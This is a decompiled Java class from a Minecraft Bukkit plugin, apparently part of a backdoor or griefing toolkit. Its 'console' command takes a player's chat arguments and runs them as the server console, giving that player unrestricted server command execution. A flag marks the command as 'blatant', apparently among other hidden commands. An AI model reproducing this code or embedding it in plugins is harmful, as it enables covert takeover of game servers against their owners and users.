/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.entity.Player;

public class ConsoleCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("console <command>"));
        } else {
            StringBuilder cmd = new StringBuilder();
            for (int i2 = 1; i2 != args.length; ++i2) {
                cmd.append(args[i2]).append(" ");
            }
            API.runCMDAsConsole(cmd.toString());
            p2.sendMessage(Settings.PREFIX("You executed " + Settings.RED + cmd + Settings.WHITE + " from the console"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

